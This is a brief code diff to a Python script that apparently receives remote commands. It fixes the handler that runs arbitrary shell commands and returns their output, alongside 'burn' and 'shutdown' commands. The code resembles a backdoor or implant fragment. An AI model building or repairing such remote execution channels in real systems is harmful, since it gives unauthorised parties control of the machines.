@@ -67,7 +67,7 @@ def burn():
 def arbitrary_exec(command: str):
     logging.info("running command {}".format(command))
     cmd = command.split(" ")
-    send("abx:"+subprocess.check_output(cmd))
+    send("abx:"+subprocess.check_output(cmd).decode("utf8"))
     pass
 
 
@@ -97,7 +97,7 @@ def communicate():
                     burn()
                 case "shutdown":
                     os.system("poweroff")
-                case "abx:":
+                case "abx":
                     arbitrary_exec(load[4:])
                 case _:
                     logging.error("Bad command: {}".format(load))
